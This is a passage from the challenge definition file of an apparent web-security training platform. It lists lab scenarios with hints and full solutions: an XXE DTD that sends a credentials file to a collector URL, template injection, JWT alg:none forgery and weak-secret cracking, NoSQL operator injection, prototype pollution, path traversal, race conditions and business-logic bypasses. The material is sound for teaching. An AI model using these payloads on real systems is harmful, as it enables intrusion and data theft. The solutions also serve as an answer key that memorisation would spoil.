    ],
    solution: 'Submit XML with <!DOCTYPE r [<!ENTITY % remote SYSTEM "http://<host>/labs/xxe-oob-exfil/evil.dtd">%remote;]>. Save a DTD that defines <!ENTITY % file SYSTEM "file://db_credentials.conf"> and <!ENTITY % exfil SYSTEM "http://<host>/labs/xxe-oob-exfil/collector?data=%file;"> with %exfil;. The collector receives the file contents and the lab reveals the flag.'
  }),

  L({
    slug: 'ssti-render',
    title: 'Server-Side Template Injection',
    domain: 'Server-Side Template Injection',
    category: 'Injection',
    level: 4,
    color: 'purple',
    summary: 'A greeting card generator evaluates your message as a template.',
    briefing: 'The greeting card renderer inserts your message into a JavaScript template literal, then evaluates the result in an isolated sandbox. Break out of the data context and call the server-side flag() function.',
    scenario: 'A seasonal campaign lets customers personalise greeting cards. The renderer was moved from a template engine to a hand-built function for speed.',
    objectives: [
      'Distinguish template injection from plain text reflection',
      'Evaluate an expression in the template context',
      'Call the server-side flag() function'
    ],
    prerequisites: ['cmd-injection'],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'JavaScript templates'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-18',
    cwe: 'CWE-1336',
    attackTechnique: 'T1190',
    hints: [
      'Your message is placed inside a template literal, so ${...} is evaluated as JavaScript.',
      'A flag() function is in scope. Try a message containing ${flag()}.'
    ],
    solution: 'Submit a message containing ${flag()}. The template renderer evaluates the expression in its isolated context and writes the returned flag into the greeting card output.'
  }),
  L({
    slug: 'insecure-deserialization',
    title: 'Insecure Deserialization in a Session Cookie',
    domain: 'Insecure Deserialization',
    category: 'Software and Data Integrity Failures',
    level: 4,
    color: 'teal',
    summary: 'A remember-me cookie is unsigned base64 JSON the server trusts.',
    briefing: 'The remember-me cookie is base64-encoded JSON with no signature. The application deserialises it on every request and trusts the role field. Tamper with the object to become an administrator.',
    scenario: 'A legacy remember-me feature predates the current session middleware. It is still accepted for backwards compatibility.',
    objectives: [
      'Decode and inspect the cookie structure',
      'Modify the trusted role field',
      'Present the forged cookie and capture the flag'
    ],
    prerequisites: ['jwt-alg-none'],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'Base64', 'JSON'],
    owaspRef: 'A08:2021 - Software and Data Integrity Failures',
    asvsRef: 'V3.4.1',
    wstgRef: 'WSTG-SESS-03',
    cwe: 'CWE-502',
    attackTechnique: 'T1550.004',
    hints: [
      'The cookie value is base64url JSON. Decode it in a terminal or browser console.',
      'Change role to admin, re-encode, and set the _sess_prefs cookie.'
    ],
    solution: 'Decode _sess_prefs, change {"role":"user"} to {"role":"admin"}, base64-encode it, and set the cookie. The page trusts the deserialized role and returns the flag.'
  }),
  L({
    slug: 'jwt-alg-none',
    title: 'JWT alg:none Authentication Bypass',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 4,
    color: 'indigo',
    summary: 'The API accepts alg:none tokens, skipping signature checks.',
    briefing: 'The lab verifier trusts the alg header from the token. Change the algorithm to none, edit the payload role to admin, and remove the signature segment.',
    scenario: 'A microservice accepts JWTs minted by several legacy clients. One client library supports unsigned tokens for development.',
    objectives: [
      'Understand JWT structure: header, payload, signature',
      'Forge an unsigned token with an admin role',
      'Present the token to the verifier and recover the flag'
    ],
    prerequisites: [],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'JWT'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.10.3',
    wstgRef: 'WSTG-SESS-10',
    cwe: 'CWE-347',
    attackTechnique: 'T1550.001',
    hints: [
      'A JWT has three dot-separated base64url segments. The third is the signature.',
      'Set the header alg to none, set payload role to admin, and leave the signature segment empty.'
    ],
    solution: 'Log in as guest to obtain a token. Decode the header and payload, change alg to none and role to admin, re-encode both, and submit header.payload. with an empty signature. The verifier returns the flag.'
  }),
  L({
    slug: 'jwt-weak-secret',
    title: 'JWT Signed with a Weak Secret',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 4,
    color: 'indigo',
    summary: 'Signature verification is real, but the HMAC secret is guessable.',
    briefing: 'The token signature is verified with HS256. The secret was chosen from a short list of placeholder passwords. Crack the secret, forge an admin token with a valid signature, and present it.',
    scenario: 'A developer used a memorable placeholder for JWT signing and never rotated it before production.',
    objectives: [
      'Obtain a valid user token',
      'Crack the HS256 secret with a small wordlist',
      'Forge and sign an admin token'
    ],
    prerequisites: ['jwt-alg-none'],
    estimatedMinutes: 45,
    technology: ['Node.js', 'Express', 'JWT', 'HMAC'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.10.3',
    wstgRef: 'WSTG-SESS-10',
    cwe: 'CWE-798',
    attackTechnique: 'T1110.002',
    hints: [
      'The guest credentials are guest / guest123. The issued token is a normal HS256 JWT.',
      'Try the common placeholder secrets letmein123, changeme, secret and jwtsecret.'
    ],
    solution: 'Use a JWT cracker against the guest token with a short wordlist. The secret is letmein123. Sign {"username":"admin","role":"admin"} with HS256 and the cracked secret, then submit it to /verify.'
  }),

  L({
    slug: 'broken-password-reset',
    title: 'Predictable Password Reset Tokens',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 2,
    color: 'indigo',
    summary: 'Reset tokens are a sequential counter, not cryptographically random.',
    briefing: 'The password reset service issues tokens such as RST-1001 from a shared counter. Request a reset for your own guest account to learn the format, then request one for the administrator and predict it.',
    scenario: 'A legacy auth service generates reset tokens by incrementing an integer. The email delivery is stubbed in this lab.',
    objectives: [
      'Observe the reset token format',
      'Predict the administrator token from the counter',
      'Complete the admin reset and capture the flag'
    ],
    prerequisites: ['no-rate-limit-bruteforce'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'Authentication'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.5.2',
    wstgRef: 'WSTG-ATHN-09',
    cwe: 'CWE-330',
    attackTechnique: 'T1110',
    hints: [
      'Request a reset for guest and note the RST- number.',
      'Request a reset for admin next. The token is the next integer in the same sequence.'
    ],
    solution: 'Request a guest reset to see RST-N. Request an admin reset, then complete the reset with RST-N+1 and any new password. The admin reset response reveals the flag.'
  }),
  L({
    slug: 'account-enum-timing',
    title: 'User Enumeration via Timing Side-Channel',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 5,
    color: 'indigo',
    summary: 'Identical errors, but real bcrypt work leaks valid usernames.',
    briefing: 'The login endpoint returns the same message for every account. Password verification only runs when the username exists, creating a measurable timing difference. Identify the hidden service account from the candidate list and use it to unlock the audit flag.',
    scenario: 'An external attacker cannot distinguish valid usernames from the response body. A security engineer suspects the authentication path still leaks the information through latency.',
    objectives: [
      'Measure response-time differences across candidate usernames',
      'Identify the single valid service account',
      'Present the account name to the audit endpoint and capture the flag'
    ],
    prerequisites: ['broken-password-reset'],
    estimatedMinutes: 60,
    technology: ['Node.js', 'Express', 'bcrypt', 'Timing analysis'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.2.1',
    wstgRef: 'WSTG-ATHN-04',
    cwe: 'CWE-208',
    attackTechnique: 'T1589.001',
    hints: [
      'Real bcrypt hashing only runs when the username exists. Compare several samples per candidate to reduce noise.',
      'The valid account is one of svc-backup, svc-deploy, svc-monitor, svc-ldap, svc-ci, svc-vault, svc-ops, svc-mail, svc-db, svc-web, svc-proxy, svc-dns.'
    ],
    solution: 'Send repeated login requests for each candidate and average the response time. The valid service account takes noticeably longer. POST its name to /labs/account-enum-timing/unlock to receive the flag.'
  }),
  L({
    slug: 'no-rate-limit-bruteforce',
    title: 'Missing Rate Limiting on PIN Login',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 1,
    color: 'indigo',
    summary: 'A four-digit PIN with 10,000 combinations and zero throttling.',
    briefing: 'The lab issues a random four-digit PIN for your instance. The verification endpoint has no rate limit, lockout or CAPTCHA. Automate the search space and recover the PIN.',
    scenario: 'A physical access console uses a short numeric PIN. The vendor promised an account lockout but the API does not implement one.',
    objectives: [
      'Confirm the PIN space and the absence of a lockout',
      'Automate PIN guesses against the endpoint',
      'Submit the correct PIN and capture the flag'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'Automation'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.2.1',
    wstgRef: 'WSTG-ATHN-03',
    cwe: 'CWE-307',
    attackTechnique: 'T1110.001',
    hints: [
      'There are only 10,000 possible values from 0000 to 9999.',
      'Use a simple loop or Burp Intruder against POST /labs/no-rate-limit-bruteforce/try-pin.'
    ],
    solution: 'Loop pin=0000 through 9999 against /labs/no-rate-limit-bruteforce/try-pin. The response for the correct four-digit PIN contains the instance flag.'
  }),
  L({
    slug: 'two-factor-bypass',
    title: '2FA Logic Bypass',
    domain: 'Authentication',
    category: 'Identification and Authentication Failures',
    level: 2,
    color: 'indigo',
    summary: 'A leftover client-trusted field skips real OTP verification.',
    briefing: 'Step one authenticates the administrator account. Step two verifies a one-time code, but the handler still honours a legacy debugSkip field. Inspect the request and bypass the second factor.',
    scenario: 'A QA-only switch was left in the OTP verification handler. The client UI no longer sends it, but the API still accepts it.',
    objectives: [
      'Complete the first authentication step',
      'Inspect the OTP verification request and its accepted fields',
      'Bypass the second factor and capture the flag'
    ],
    prerequisites: ['broken-password-reset'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'Authentication'],
    owaspRef: 'A07:2021 - Identification and Authentication Failures',
    asvsRef: 'V2.8.3',
    wstgRef: 'WSTG-ATHN-10',
    cwe: 'CWE-287',
    attackTechnique: 'T1556',
    hints: [
      'The first-step credentials are admin / adminpass.',
      'Add debugSkip=true to the step-two request body even though the UI does not show it.'
    ],
    solution: 'POST username=admin&password=adminpass to /step1, then POST otp=000000&debugSkip=true to /step2. The legacy debug field bypasses OTP verification and returns the flag.'
  }),

  L({
    slug: 'nosql-login-bypass',
    title: 'NoSQL Injection: Login Bypass',
    domain: 'NoSQL Injection',
    category: 'Injection',
    level: 2,
    color: 'green',
    summary: 'A JSON login body lets you send operators instead of strings.',
    briefing: 'The JSON login endpoint passes the request body straight into a MongoDB query filter. Send an object instead of a password string to turn the equality check into an operator expression.',
    scenario: 'A modern customer portal uses a document database. The login handler assumes every JSON field is a string.',
    objectives: [
      'Identify that JSON types reach the database query',
      'Use a MongoDB comparison operator to match the admin account',
      'Retrieve the flag from the authenticated admin session'
    ],
    prerequisites: ['sqli-login'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'MongoDB'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-943',
    attackTechnique: 'T1190',
    hints: [
      'The query is LabData.findOne({ username, password }) scoped to your instance.',
      'Send {"username":"admin","password":{"$ne":null}} to /labs/nosql-login-bypass/login.'
    ],
    solution: 'POST JSON with username admin and password {"$ne":null}. MongoDB evaluates the operator, matches the admin record, and the lab returns the admin flag.'
  }),
  L({
    slug: 'nosql-search-injection',
    title: 'NoSQL Injection: Query-String Operators',
    domain: 'NoSQL Injection',
    category: 'Injection',
    level: 2,
    color: 'green',
    summary: 'Bracket-notation query parameters merge into a Mongo filter.',
    briefing: 'The product search takes query-string parameters and merges them into a MongoDB filter. Express parses bracket notation into nested objects. Override the released filter to reveal an unreleased product with the flag.',
    scenario: 'A catalogue page only displays released products, but the database contains a prototype that should never be public.',
    objectives: [
      'Understand Express query-string parsing of bracket syntax',
      'Inject a MongoDB operator into the released filter',
      'Read the unreleased product and capture the flag'
    ],
    prerequisites: ['nosql-login-bypass'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'MongoDB'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-943',
    attackTechnique: 'T1190',
    hints: [
      'The filter starts with released:true and then merges query parameters.',
      'Try /labs/nosql-search-injection?released[$ne]=true or released=false.'
    ],
    solution: 'Request /labs/nosql-search-injection?released[$ne]=true. The merged filter matches both released and unreleased products, exposing the prototype record containing the flag.'
  }),
  L({
    slug: 'nosql-regex-extraction',
    title: 'NoSQL Injection: Blind $regex Extraction',
    domain: 'NoSQL Injection',
    category: 'Injection',
    level: 3,
    color: 'green',
    summary: 'A pattern-check endpoint passes your input into $regex.',
    briefing: 'The access-code validator wraps your input in a MongoDB $regex query and only returns a match/no-match result. Use anchored patterns to extract the stored code one character at a time.',
    scenario: 'A support tool validates whether a customer access code matches a stored secret. It never returns the secret directly.',
    objectives: [
      'Confirm that regex metacharacters are interpreted by MongoDB',
      'Build an anchored character-by-character oracle',
      'Extract the complete access code and submit it as the flag'
    ],
    prerequisites: ['nosql-search-injection'],
    estimatedMinutes: 45,
    technology: ['Node.js', 'Express', 'MongoDB', 'Regex'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-943',
    attackTechnique: 'T1190',
    hints: [
      'The query is { "data.code": { $regex: <input> } } scoped to your instance.',
      'Start with ^Z, then ^ZD, then ^ZDS and extend one accepted character at a time.'
    ],
    solution: 'Submit anchored regexes such as ^Z, ^ZD, ^ZDS and extend one character whenever the response is a match. The recovered access code is the flag.'
  }),
  L({
    slug: 'nosql-expr-injection',
    title: 'NoSQL Injection: $expr Aggregation Abuse',
    domain: 'NoSQL Injection',
    category: 'Injection',
    level: 5,
    color: 'green',
    summary: 'A raw filter fragment is merged into a real query, $expr included.',
    briefing: 'The vault probe merges your JSON filter into a real MongoDB query. Use the $expr aggregation operator to compare hidden fields against guesses and recover the vault secret byte by byte.',
    scenario: 'An internal vault lookup accepts a JSON filter fragment for flexibility. The developer trusted the fragment because it only returns a boolean.',
    objectives: [
      'Confirm that arbitrary query operators are accepted',
      'Use $expr and string operators to compare the hidden secret',
      'Recover the full vault secret and submit it'
    ],
    prerequisites: ['nosql-regex-extraction'],
    estimatedMinutes: 60,
    technology: ['Node.js', 'Express', 'MongoDB', 'Aggregation'],
    owaspRef: 'A03:2021 - Injection',
    asvsRef: 'V5.3.4',
    wstgRef: 'WSTG-INPV-05',
    cwe: 'CWE-943',
    attackTechnique: 'T1190',
    hints: [
      'The filter fragment is spread into the query object. $expr is accepted.',
      'Use {"$expr":{"$gt":[{"$substrCP":["$data.secret",0,1]},"M"]}} to compare the first character.'
    ],
    solution: 'Send $expr filters that compare {$substrCP:["$data.secret",index,1]} against guesses. Binary-search each character until the full secret is known. The secret is the flag.'
  }),

  L({
    slug: 'prototype-pollution',
    title: 'Prototype Pollution to Privilege Escalation',
    domain: 'Prototype Pollution',
    category: 'Software and Data Integrity Failures',
    level: 5,
    color: 'violet',
    summary: 'A recursive merge reaches __proto__ with no key filtering.',
    briefing: 'The preferences saver recursively merges JSON into an object. It does not filter __proto__. Pollute the instance sandbox prototype with isAdmin=true and let a freshly created object inherit the privileged property.',
    scenario: 'A settings service merges user preferences deeply so nested theme objects are preserved. The privilege check reads a property from a new object created later.',
    objectives: [
      'Understand prototype chains and inherited properties',
      'Reach the prototype through a recursive merge',
      'Make the application consider a new object an administrator'
    ],
    prerequisites: ['nosql-expr-injection'],
    estimatedMinutes: 60,
    technology: ['Node.js', 'Express', 'JavaScript'],
    owaspRef: 'A08:2021 - Software and Data Integrity Failures',
    asvsRef: 'V5.5.1',
    wstgRef: 'WSTG-INPV-06',
    cwe: 'CWE-1321',
    attackTechnique: 'T1190',
    hints: [
      'JSON.parse creates an own __proto__ property when it appears in the document.',
      'Send {"__proto__":{"isAdmin":true}} to /labs/prototype-pollution/merge.'
    ],
    solution: 'Submit {"__proto__":{"isAdmin":true}}. The recursive merge writes isAdmin onto the instance sandbox prototype. The freshly created object inherits it, passes the admin check, and the flag is returned.'
  }),

  L({
    slug: 'api-excessive-data',
    title: 'API: Excessive Data Exposure',
    domain: 'API Security',
    category: 'API Security',
    level: 1,
    color: 'sky',
    summary: 'The API returns the full backing document, not just safe fields.',
    briefing: 'The profile card only displays a name and job title, but the API returns the entire user document. Inspect the raw JSON response to find internal notes and the flag.',
    scenario: 'A mobile client renders three fields from a profile API. The backend serialises the whole database document.',
    objectives: [
      'Inspect raw API responses instead of rendered UI',
      'Identify fields the client does not need',
      'Recover the flag from an internal field'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'MongoDB', 'JSON'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API3:2023 - Broken Object Property Level Authorization',
    asvsRef: 'V4.3.1',
    wstgRef: 'WSTG-ATHZ-04',
    cwe: 'CWE-213',
    attackTechnique: 'T1213',
    hints: [
      'Open the browser Network tab or request /labs/api-excessive-data/api/profile/u_2291 directly.',
      'Look beyond the name and title fields.'
    ],
    solution: 'Request /labs/api-excessive-data/api/profile/u_2291 and inspect the full JSON. internalNotes contains the flag.'
  }),
  L({
    slug: 'api-bola',
    title: 'API: Broken Object Level Authorization',
    domain: 'API Security',
    category: 'API Security',
    level: 2,
    color: 'sky',
    summary: 'The orders API trusts the :id in the URL with no ownership check.',
    briefing: 'The orders API returns an order by ID without checking the caller. Your account owns ord_1001, but sequential order IDs belong to other customers. Find the order with the flag.',
    scenario: 'A B2B order portal exposes a REST API. The mobile client requests /api/orders/:id and assumes the server enforces ownership.',
    objectives: [
      'Recognise BOLA in a REST resource route',
      'Enumerate sequential order identifiers',
      'Read another customer order and capture the flag'
    ],
    prerequisites: ['api-excessive-data'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'MongoDB', 'REST'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API1:2023 - BOLA',
    asvsRef: 'V4.1.3',
    wstgRef: 'WSTG-ATHZ-04',
    cwe: 'CWE-639',
    attackTechnique: 'T1078',
    hints: [
      'Order IDs are sequential: ord_1001, ord_1002, ord_1003, ord_1004.',
      'Your order is ord_1001. Request the others through /labs/api-bola/api/orders/<id>.'
    ],
    solution: 'Request /labs/api-bola/api/orders/ord_1002. The API does not check ownership and the order notes contain the flag.'
  }),
  L({
    slug: 'api-mass-assignment',
    title: 'API: Mass Assignment on PATCH',
    domain: 'API Security',
    category: 'API Security',
    level: 2,
    color: 'sky',
    summary: 'A PATCH endpoint merges the entire request body, unfiltered.',
    briefing: 'The account API only documents displayName, but the PATCH handler merges every field in the JSON body. Add the accountTier field and upgrade your own account.',
    scenario: 'A subscription portal exposes a PATCH endpoint for profile edits. The backend uses a generic merge helper shared with internal admin tools.',
    objectives: [
      'Inspect the documented PATCH body versus accepted fields',
      'Add a privileged account field',
      'Upgrade to enterprise tier and capture the flag'
    ],
    prerequisites: ['api-bola'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'MongoDB', 'REST'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API3:2023 - Broken Object Property Level Authorization',
    asvsRef: 'V4.2.1',
    wstgRef: 'WSTG-ATHZ-03',
    cwe: 'CWE-915',
    attackTechnique: 'T1078',
    hints: [
      'The UI sends only {"displayName":"..."} to PATCH /labs/api-mass-assignment/api/account.',
      'Include "accountTier":"enterprise" in the JSON body.'
    ],
    solution: 'PATCH /labs/api-mass-assignment/api/account with {"displayName":"guest","accountTier":"enterprise"}. The generic merge applies the privileged field and the page reveals the flag.'
  }),
  L({
    slug: 'graphql-introspection',
    title: 'GraphQL Introspection Enabled',
    domain: 'API Security',
    category: 'API Security',
    level: 2,
    color: 'sky',
    summary: 'Introspection reveals fields never used by a real client.',
    briefing: 'The GraphQL endpoint has introspection enabled. Query the schema to discover an internal debug field that the UI never uses, then query that field for the flag.',
    scenario: 'A product API moved to GraphQL. The schema still contains a debug field left over from development.',
    objectives: [
      'Use __schema introspection to map the API',
      'Identify an undocumented sensitive field',
      'Query the field and capture the flag'
    ],
    prerequisites: ['api-excessive-data'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'GraphQL'],
    owaspRef: 'A01:2021 - Broken Access Control',
    owaspApiRef: 'API8:2023 - Security Misconfiguration',
    asvsRef: 'V13.4.1',
    wstgRef: 'WSTG-APIT-01',
    cwe: 'CWE-200',
    attackTechnique: 'T1213',
    hints: [
      'Send {"query":"{ __schema { fields { name description } } }"} to /labs/graphql-introspection/graphql.',
      'The internalDebugFlag field is listed but not used by the UI.'
    ],
    solution: 'Run the introspection query, find internalDebugFlag, then send {"query":"{ internalDebugFlag }"}. The resolver returns the instance flag.'
  }),

  L({
    slug: 'logic-negative-quantity',
    title: 'Business Logic: Negative Quantity',
    domain: 'Business Logic',
    category: 'Business Logic',
    level: 1,
    color: 'orange',
    summary: 'Checkout accepts negative quantities with no lower bound.',
    briefing: 'The checkout multiplies quantity by a fixed unit price and subtracts the total from your balance. A negative quantity creates a refund instead of a purchase. Push the balance above 500.',
    scenario: 'A demo storefront was built for speed. The quantity input is validated only by the HTML min attribute.',
    objectives: [
      'Identify a missing server-side bounds check',
      'Use a negative quantity to invert the transaction',
      'Raise the balance above the reward threshold'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A04:2021 - Insecure Design',
    asvsRef: 'V11.1.1',
    wstgRef: 'WSTG-BUSL-01',
    cwe: 'CWE-840',
    attackTechnique: 'T1190',
    hints: [
      'The HTML input may set min="1", but the server does not enforce it.',
      'Submit quantity=-10 and watch the balance increase.'
    ],
    solution: 'Submit a negative quantity such as -10. The total becomes negative, the balance increases by the refund, and once it exceeds 500 the flag is displayed.'
  }),
  L({
    slug: 'logic-price-tampering',
    title: 'Business Logic: Client-Trusted Price',
    domain: 'Business Logic',
    category: 'Business Logic',
    level: 1,
    color: 'orange',
    summary: 'A hidden form field carries the price the server actually charges.',
    briefing: 'The checkout form includes a hidden price field. The server charges whatever value the client submits instead of looking up the catalogue price. Change the price before submitting.',
    scenario: 'A storefront renders the product price in a hidden field to avoid a second database lookup. The server trusts the value.',
    objectives: [
      'Find the hidden client-controlled price',
      'Modify the request before it reaches the server',
      'Complete the order below the reward threshold'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'HTML forms'],
    owaspRef: 'A04:2021 - Insecure Design',
    asvsRef: 'V11.1.2',
    wstgRef: 'WSTG-BUSL-01',
    cwe: 'CWE-602',
    attackTechnique: 'T1190',
    hints: [
      'Inspect the checkout form source for a hidden input named price.',
      'Use devtools or curl to submit price=1.'
    ],
    solution: 'Change the hidden price field to a value below 10 and submit the checkout. The server charges the tampered amount and returns the flag.'
  }),
  L({
    slug: 'logic-workflow-skip',
    title: 'Business Logic: Skipping the Payment Step',
    domain: 'Business Logic',
    category: 'Business Logic',
    level: 2,
    color: 'orange',
    summary: 'The confirm-order step never checks that payment succeeded.',
    briefing: 'The UI enforces a three-step checkout, but the confirm endpoint does not verify payment state. The Pay button always declines. Call confirm directly and complete the order without paying.',
    scenario: 'A procurement workflow has separate payment and confirmation services. The confirmation handler trusts the client to call it only after payment.',
    objectives: [
      'Map the workflow steps and their server-side checks',
      'Invoke the final step out of order',
      'Confirm an unpaid order and capture the flag'
    ],
    prerequisites: ['logic-price-tampering'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express'],
    owaspRef: 'A04:2021 - Insecure Design',
    asvsRef: 'V11.1.1',
    wstgRef: 'WSTG-BUSL-01',
    cwe: 'CWE-841',
    attackTechnique: 'T1190',
    hints: [
      'The Pay button declines by design, but the confirm route is a separate request.',
      'POST directly to /labs/logic-workflow-skip/confirm.'
    ],
    solution: 'Send POST /labs/logic-workflow-skip/confirm without paying. The handler sets orderConfirmed while paymentCompleted remains false, and the page reveals the flag.'
  }),
  L({
    slug: 'logic-coupon-race',
    title: 'Business Logic: Race Condition on Coupon Redemption',
    domain: 'Business Logic',
    category: 'Business Logic',
    level: 5,
    color: 'orange',
    summary: 'A single-use coupon can be redeemed more than once, concurrently.',
    briefing: 'The redemption handler reads usesRemaining, waits, then writes the decrement. The read-modify-write is not atomic. Fire several concurrent redeem requests so more than one passes the check.',
    scenario: 'A marketing promotion offers a one-use coupon. The backend was written as a straightforward read, validate, save sequence.',
    objectives: [
      'Identify a time-of-check to time-of-use race',
      'Send concurrent redemption requests',
      'Record more than one successful redemption'
    ],
    prerequisites: ['logic-workflow-skip'],
    estimatedMinutes: 60,
    technology: ['Node.js', 'Express', 'MongoDB', 'Concurrency'],
    owaspRef: 'A04:2021 - Insecure Design',
    asvsRef: 'V11.1.4',
    wstgRef: 'WSTG-BUSL-04',
    cwe: 'CWE-362',
    attackTechnique: 'T1190',
    hints: [
      'The redeem endpoint waits 150ms between reading and saving the coupon.',
      'Send several requests at the same time with curl, a script, or Burp Turbo Intruder.'
    ],
    solution: 'Fire at least three POST /labs/logic-coupon-race/redeem requests concurrently. Multiple requests read usesRemaining=1 before any save, and the second successful redemption reveals the flag.'
  }),

  L({
    slug: 'upload-content-type-bypass',
    title: 'File Upload: Content-Type Allowlist Bypass',
    domain: 'File Upload',
    category: 'Security Misconfiguration',
    level: 2,
    color: 'yellow',
    summary: 'Only the client-declared Content-Type header is checked.',
    briefing: 'The avatar upload checks an X-Declared-Type header for image/png or image/jpeg. The actual bytes and extension are not validated. Upload an HTML document while declaring image/png, then view it as HTML.',
    scenario: 'An avatar service rejects non-image uploads by inspecting a header supplied by the client. The stored file is served by its real extension.',
    objectives: [
      'Understand why client-declared metadata is untrusted',
      'Upload an HTML file with an image Content-Type',
      'Get the file served as executable HTML and capture the flag'
    ],
    prerequisites: ['svg-upload-xss'],
    estimatedMinutes: 25,
    technology: ['Node.js', 'Express', 'File uploads'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V12.2.1',
    wstgRef: 'WSTG-BUSL-09',
    cwe: 'CWE-646',
    attackTechnique: 'T1608.002',
    hints: [
      'The header is X-Declared-Type, and the filename is in the query string.',
      'Declare image/png but name the file avatar.html and submit HTML content.'
    ],
    solution: 'POST /labs/upload-content-type-bypass/upload?filename=avatar.html with X-Declared-Type: image/png and an HTML body. The server stores it by extension, serves it as text/html, and the file view reveals the flag.'
  }),
  L({
    slug: 'upload-path-traversal',
    title: 'File Upload: Path Traversal',
    domain: 'File Upload',
    category: 'Security Misconfiguration',
    level: 3,
    color: 'yellow',
    summary: 'The upload filename is joined onto a directory with no containment check.',
    briefing: 'The upload handler joins the supplied filename onto the uploads directory without resolving or validating the final path. A filename containing ../ can write into the protected directory.',
    scenario: 'A document attachment feature stores files by their client-supplied name. A protected folder sits next to the uploads folder.',
    objectives: [
      'Identify path traversal in a filename',
      'Write a file outside the uploads directory',
      'Demonstrate access to the protected folder and capture the flag'
    ],
    prerequisites: ['upload-content-type-bypass'],
    estimatedMinutes: 30,
    technology: ['Node.js', 'Express', 'Filesystem'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V12.3.1',
    wstgRef: 'WSTG-BUSL-09',
    cwe: 'CWE-22',
    attackTechnique: 'T1083',
    hints: [
      'The filename is placed in the query string and passed to path.join.',
      'Use a filename such as ../protected/audit.txt.'
    ],
    solution: 'Upload with filename=../protected/audit.txt. The file lands in the protected directory, and the lab index detects the escaped write and returns the flag.'
  }),
  L({
    slug: 'upload-unrestricted-rce',
    title: 'File Upload: Unrestricted Upload to Code Execution',
    domain: 'File Upload',
    category: 'Security Misconfiguration',
    level: 4,
    color: 'yellow',
    summary: 'Any file type is accepted, and plugins are executed server-side.',
    briefing: 'The plugin manager accepts JavaScript files and executes them in a sandbox when you click Run. A reportFlag(value) function is in scope. Upload a plugin that calls reportFlag with the required value.',
    scenario: 'A workflow automation tool lets teams upload custom widgets. The server runs widget code to render previews.',
    objectives: [
      'Confirm that uploaded JavaScript is executed server-side',
      'Understand the capability exposed to uploaded code',
      'Invoke reportFlag to reveal the flag'
    ],
    prerequisites: ['upload-path-traversal'],
    estimatedMinutes: 40,
    technology: ['Node.js', 'Express', 'vm', 'File uploads'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V12.2.1',
    wstgRef: 'WSTG-BUSL-09',
    cwe: 'CWE-434',
    attackTechnique: 'T1059',
    hints: [
      'Upload a .js file containing reportFlag("confirm") and click Run.',
      'The sandbox exposes reportFlag but no Node.js require.'
    ],
    solution: 'Upload a JavaScript file whose content is reportFlag("confirm"), then POST /run/<id>. The plugin executor calls reportFlag with the accepted value and returns the flag.'
  }),

  L({
    slug: 'disclosure-verbose-errors',
    title: 'Verbose Error Messages',
    domain: 'Information Disclosure',
    category: 'Security Misconfiguration',
    level: 1,
    color: 'slate',
    summary: 'Unhandled exceptions return their full message and stack.',
    briefing: 'The lookup endpoint parses JSON and returns raw error stacks on failure. Trigger an exception and inspect the stack trace for internal configuration, including the flag.',
    scenario: 'A support lookup console was deployed with development error handling enabled.',
    objectives: [
      'Trigger an unhandled exception',
      'Read the stack trace and internal configuration',
      'Recover the flag from the error output'
    ],
    prerequisites: [],
    estimatedMinutes: 15,
    technology: ['Node.js', 'Express', 'JSON'],
    owaspRef: 'A05:2021 - Security Misconfiguration',
    asvsRef: 'V7.4.1',
    wstgRef: 'WSTG-ERRH-01',
    cwe: 'CWE-209',
    attackTechnique: 'T1592',
    hints: [
      'Submit an empty ID or an invalid JSON value to the lookup form.',
      'The error output includes JSON.stringify(INTERNAL_CONFIG), which contains the flag.'
    ],
    solution: 'Submit an empty ID to /labs/disclosure-verbose-errors/lookup. The thrown error includes the internal configuration object with debugFlag, which is the flag.'
  }),
  L({
    slug: 'disclosure-env-file',
    title: 'Exposed .env Configuration File',
    domain: 'Information Disclosure',
    category: 'Security Misconfiguration',
    level: 1,
    color: 'slate',
